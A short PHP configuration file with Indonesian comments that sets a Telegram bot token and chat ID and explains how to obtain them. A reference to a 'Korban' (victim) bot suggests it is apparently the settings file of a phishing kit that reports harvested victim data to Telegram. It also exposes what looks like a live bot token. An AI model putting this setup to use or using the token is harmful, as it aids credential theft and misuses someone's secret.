<?php 
$id_bot = "6492825279:AAFbrdToGKaqt89OtIYQP5JKpy4dYH1gzWc"; // Bot Baru -> Add @BotFather, Klik Start, Kasih nama bot, copy Access Token lalu paste disini
$telegram_id   = "6933463853"; // Ganti ChatId -> Add @chatIDrobot di telegram, klik start, copy chatId lalu Paste disini || KLIK START PADA BOT @KorbanTeleBot

// Note, Akun telegram kamu harus Join/Bergabung ke BOT yang kamu buat


?>